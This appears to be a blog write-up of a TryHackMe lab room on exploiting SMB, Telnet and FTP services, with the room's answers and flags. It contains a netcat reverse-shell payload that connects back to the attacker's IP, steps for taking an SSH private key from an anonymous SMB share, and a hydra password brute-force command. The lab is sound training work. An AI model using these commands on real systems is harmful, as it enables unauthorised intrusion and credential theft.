---
layout: post
title: Write-Up [THM] Network Services
categories: [Write-Ups, TryHackMe]
tags: [TryHackMe, Networking, SMB, Telnet, FTP]
featured-image:  thm/network-services/theme.png
featured-image-alt: Network Services
---

It's a write-up about the room : [Try Hack Me - Room : Network Services](https://tryhackme.com/room/networkservices)

# [Task 1] Get Connected

> This room will explore common Network Service vulnerabilities and misconfigurations.

# [Task 2] - Understanding SMB

![Task 1](/assets/img/thm/network-services/task-1.png)

* What does SMB stand for? `Server Message Block`

* What type of protocol is SMB? `response-request`

* What do clients connect to servers using? `tcp/ip`

* What systems does Samba run on? `Unix`

# [Task 3] - Enumerating SMB

![Task 3](/assets/img/thm/network-services/task-3.png)

We scan all ports using `sudo nmap -sV -sC ip_machine`

* Conduct an nmap scan of your choosing, How many ports are open? `3`

* What ports is SMB running on? `139/445`

* Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name? `WORKGROUP`

* Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name? `polosmb`

* What operating system version is running? `6.1`

* What share sticks out as something we might want to investigate? `profiles`

# [Task 4] - Exploiting SMB

![Task 4](/assets/img/thm/network-services/task-4.png)

* What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?

We find that default SMB port are 139 and 445 by googling.   
So, the correct syntax to access is : `smbclient //10.10.10.2/secret -U suit -p 139`

* Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by:

- using the username "Anonymous"

- connecting to the share we found during the enumeration stage

- and not supplying a password.

Does the share allow anonymous access? Y/N? `Y`

We use : `smbclient //10.10.244.174/profiles -U Anonymous -p 139`

*  	Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to? 

`get "Working From Home Information.txt"`
This file is a copy of an e-mail adressed to **John Cactus**.

```
John Cactus

As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever possible, employees should work from home. As such- your account has now been enabled with ssh access to the main server. 

If there are any problems, please contact the IT department at it@polointernalcoms.uk

Regards, 

James
Department Manager
```

* What service has been configured to allow him to work from home? `ssh`

We use `ls` and find the directory **.ssh**.

* This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us? 

We use `ls` to see the differents files : 

```
id_rsa
id_rsa.pub
authorized_keys
```

The most useful key for us is **id_rsa**. 

* Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]". 
Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server. 
What is the smb.txt flag?

So, we get it `get id_rsa`. We change the permission of the file `chmod 600`.  
After that, we connect with ssh :  `ssh -i id_rsa cactus@ip_machine`. 

We use `ls`. There is the file `smb.txt`, so : `cat smb.txt`.   
The flag is `THM{smb_is_fun_eh?}`.

# [Task 5] - Understanding Telnet

![Task 5](/assets/img/thm/network-services/task-5.png)

* What is Telnet? `application protocol`

* What has slowly replaced Telnet? `ssh`

* How would you connect to a Telnet server with the IP 10.10.10.3 on port 23? `telnet 10.10.10.3 23`

* The lack of what, means that all Telnet communication is in plaintext? `encryption`

# [Task 6] - Enumerating Telnet

> We've already seen how key enumeration can be in exploiting a misconfigured network service. However, vulnerabilities that could be potentially trivial to exploit don't always jump out at us. For that reason, especially when it comes to enumerating network services, we need to be thorough in our method. 

> Let's start out the same way we usually do, a port scan, to find out as much information as we can about the services, applications, structure and operating system of the target machine. Scan the machine with nmap and the tag -A and -p-.

We deploy the instance.

* How many ports are open on the target machine?

We use nmap : `nmap -A -p- ip_machine` and find `1` port opened.

* What port is this ? `8012`

* This port is unassigned, but still lists the protocol it's using, what protocol is this? `tcp`

* Now re-run the nmap scan, without the -p- tag, how many ports show up as open? 

We use : `nmap -A ip_machine` and find `0` port opened.

* Based on the title returned to us, what do we think this port could be used for? `a backdoor`

* Who could it belong to? Gathering possible usernames is an important step in enumeration. `skidy`

# [Task 7] - Exploiting Telnet

> Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control.

![Task 7](/assets/img/thm/network-services/task-7.png)

* Great! It's an open telnet connection! What welcome message do we receive? `Skidy's backdoor`

* Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N) `N`

* Now, use the command "ping [local tun0 ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N) `Y`

* We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax: `msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`

```
-p = payload
lhost = our local host IP address
lport = the port to listen on
R = export the payload in raw format
```

What word does the generated payload start with?

We use : `msfvenom -p cmd/unix/reverse_netcat lhost=local lport=4444 R`.  
The output is : `mkfifo /tmp/jwgd; nc 10.10.54.200 4444 0</tmp/jwgd | /bin/sh >/tmp/jwgd 2>&1; rm /tmp/jwgd`.  
local is the local ip not the ip machine.

Therefore, the generated payload start with `mkfifo`.

* Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:

`nc -lvp [listening port]`

What would the command look like for the listening port we selected in our payload? `nc -lvp 4444`

* Success! What is the contents of flag.txt?

We use `nc -lvp 444` on one terminal. In an other we connecte with telnet : `telnet ip_machine 8012` and run the payload : `.RUN mkfifo ...`.   
On the terminal with netcat we can use the shell, so `ls` and find a `flag.txt` file.  
We read it and the content is `THM{y0u_g0t_th3_t3ln3t_fl4g}`.

# [Task 8] - Understanding FTP

![Task 8](/assets/img/thm/network-services/task-8.png)

* What communications model does FTP use? `client-server`

* What's the standard FTP port? `21`

* How many modes of FTP connection are there? `2`

# [Task 9] - Enumerating FTP

> We're going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system. This is a common pathway in CTF challenges, and mimics a real-life careless implementation of FTP servers.

* Run an nmap scan of your choice. How many ports are open on the target machine? 

We use `nmap -A -sV -p- ip_machine` and find `2` ports opened.

* What port is ftp running on? 

We have : 

``` 
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             353 Apr 24 11:16 PUBLIC_NOTICE.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.87.25
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```

FTp was running on port `21`.

* What variant of FTP is running on it? `vsFTPd`

* Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing "ftp [IP]" into the console, and entering "anonymous", and no password when prompted.

What is the name of the file in the anonymous FTP directory?

We use `ftp ip_machine` with the login `anonymous`.  
After that, we use the command `ls` and find the file **PUBLIC_NOTICE.txt**.

*  	What do we think a possible username could be?

We get the file with `get PUBLIC_NOTICE.txt` and read it with `cat` : `cat PUBLIC_NOTICE.txt`. 

```
===================================
MESSAGE FROM SYSTEM ADMINISTRATORS
===================================

Hello,

I hope everyone is aware that the
FTP server will not be available 
over the weekend- we will be 
carrying out routine system 
maintenance. Backups will be
made to my account so I reccomend
encrypting any sensitive data.

Cheers,

Mike 
```

A possible username can be `Mike`.

# [Task 10] - Exploiting FTP

![Task 10](/assets/img/thm/network-services/task-10.png)

* What is the password for the user "mike"?

We use hydra : `hydra -t 4 -l mike -P rockyou.txt -vV ip_machine ftp` and find the password : **password**.

* What is ftp.txt?

We connecte with ftp : `ftp ip_machine` with the login `mike` and the password `password`.  
We use `ls` and find the file `ftp.txt`. We get it with `get ftp.txt`. We read it with the command `cat ftp.txt`.  
The flag is `THM{y0u_g0t_th3_ftp_fl4g}`.